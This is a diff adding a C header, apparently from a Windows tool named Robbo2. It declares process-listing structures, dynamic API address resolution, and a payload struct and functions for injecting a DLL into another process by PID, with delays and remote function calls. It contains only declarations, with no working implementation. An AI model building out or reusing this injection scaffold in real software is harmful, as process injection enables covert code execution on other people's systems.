@@ -1,0 +1,97 @@
+#!name##Robbo2Proc_H
+#!itemType##sfile
+#!info##Robbo2 Proc header file.
+#!lang##c
+
+#ifndef ROBBO_PROC_H
+#define ROBBO_PROC_H
+
+#include "robbo2_base.h"
+#include "robbo2_locust.h"
+
+#include <wchar.h>
+
+#define ROBBO_PROC_PAYLOAD_DLL_NAME_BUFF 1024
+#define ROBBO_PROC_PAYLOAD_DLL_FUNC_NAME 64
+#define ROBBO_PROC_PAYLOAD_DLL_FUNC_ARG_SIZE 32
+
+// Types
+typedef BOOL (*Rtype_QueryFullProcessImageNameW)(HANDLE, DWORD, LPWSTR, PDWORD);
+typedef void* (*Rtype_GetProcAddress)(HMODULE, LPCSTR);
+
+
+// Struct
+
+typedef struct _ROBBO_PROC_PID_LIST {
+    DWORD *list;
+    int size;
+    void (*clear)(struct _ROBBO_PROC_PID_LIST *pid_list);
+} ROBBO_PROC_PID_LIST, *pROBBO_PROC_PID_LIST;
+
+typedef struct _ROBBO_PROCESS {
+    HANDLE handle;
+    char *name;
+    int name_size;
+    int fpath_char_size;
+    char *fpath_std;
+    WCHAR *fpath_wchar;
+    WCHAR *fpath_nt;
+    DWORD pid;
+    int error;
+    void (*clear)(struct _ROBBO_PROCESS *robbo_process);
+    struct _ROBBO_PROCESS *next;
+} ROBBO_PROCESS, *pROBBO_PROCESS;
+
+typedef struct _ROBBO_PROCESS_LIST {
+    int size;
+    pROBBO_PROCESS first;
+    pROBBO_PROCESS next;
+    void (*clear)(struct _ROBBO_PROCESS_LIST *proc_list);
+} ROBBO_PROCESS_LIST, *pROBBO_PROCESS_LIST;
+
+typedef struct _ROBBO_PAYLOAD_INJECT_DLL {
+    WCHAR dll_name[ROBBO_PROC_PAYLOAD_DLL_NAME_BUFF];
+    UNICODE_STRING dll_name_US;
+    HMODULE mod_handle;
+    RtypeLdrLoadDll LdrLoadDll;
+    Rtype_GetProcAddress GetProcAddr;
+    RtypeSleep PauseMe;
+    DWORD pause;
+    DWORD in_delay;
+    void* (*exeFuncFirst)(void*);
+    void (*exeFuncSecond)(void*);
+    char exe_first_func_name[ROBBO_PROC_PAYLOAD_DLL_FUNC_NAME];
+    char exe_second_func_name[ROBBO_PROC_PAYLOAD_DLL_FUNC_NAME];
+    int exe_first_FLAG;
+    int exe_sec_FLAG;
+    char arg1[ROBBO_PROC_PAYLOAD_DLL_FUNC_ARG_SIZE];
+    char arg2[ROBBO_PROC_PAYLOAD_DLL_FUNC_ARG_SIZE];
+    int arg1_size;
+    int arg2_size;
+} ROBBO_PAYLOAD_INJECT_DLL, *pROBBO_PAYLOAD_INJECT_DLL;
+
+
+// WINAPI functions
+BOOL robbo_wapi_QueryFullProcessImageNameW(HANDLE proc_handle, DWORD dwFlags, LPWSTR buff_path, PDWORD buff_size);
+
+// Address Functions
+Rtype_QueryFullProcessImageNameW robbo_faddr_QueryFullProcessImageNameW(void);
+Rtype_GetProcAddress robbo_faddr_GetProcAddress(void);
+
+// Payload Functions
+void WINAPI robbo_proc_pfunc_inject_dll(pROBBO_PAYLOAD_INJECT_DLL payload);
+void WINAPI robbo_proc_pfunc_inject_dll_end(void);
+int robbo_proc_inject_dll(DWORD pid, pROBBO_PAYLOAD_INJECT_DLL payload);
+
+
+// ROBBO Functions
+pROBBO_PROC_PID_LIST robbo_proc_get_pid_list(int list_size);
+pROBBO_PROCESS robbo_proc_get_process(DWORD pid);
+pROBBO_PROCESS_LIST robbo_proc_get_process_list(void);
+pROBBO_PROCESS robbo_proc_find_process_first(char *process_name);
+NTSTATUS robbo_proc_create_file(HANDLE file_handle, char *fpath, void *src_data, int data_size);
+
+pROBBO_PAYLOAD_INJECT_DLL robbo_build_payload_dll_inject(char *dll_name, char *FirstFunc, char *arg1, int arg1_size, char *SecFunc, char *arg2, int arg2_size, DWORD pause_time, DWORD inj_delay);
+
+
+#endif
